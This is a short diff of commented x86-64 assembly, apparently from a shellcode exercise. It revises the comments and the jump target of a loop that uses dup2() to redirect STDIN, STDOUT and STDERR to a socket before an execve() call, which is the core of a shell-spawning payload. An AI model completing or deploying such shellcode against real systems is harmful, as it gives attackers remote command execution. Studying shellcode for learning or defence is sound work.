@@ -34,11 +34,11 @@ _start:
       xchg rax, rdi                ; saving results for later use
       push byte +0x3
       pop rsi                      ; RSI loop = 3
-      dec rsi                      ; RSI minus 1 <---------<-------------<-|
-      push byte +0x21              ; = 33                                  |
-      pop rax                      ; syscall dup2()                        |
-      syscall                      ; executing syscall dup2()              |
-      jne 0x555555558093           ; JNE -> loop to instruction dec rsi >->|
+      dec rsi                      ; RSI minus 1 <-------<-----------<-----------<-----------<-------------<-----|
+      push byte +0x21              ; = 33                                                                        |
+      pop rax                      ; syscall dup2()                                                              |
+      syscall                      ; executing syscall dup2()                                                    |
+      jnz 0x27                     ; JNE -> loop to instruction dec rsi (redirects STDERR, STDOUT and STDIN -->->| 
       push byte +0x3b              ; = 59
       pop rax                      ; syscall execve()
       cdq
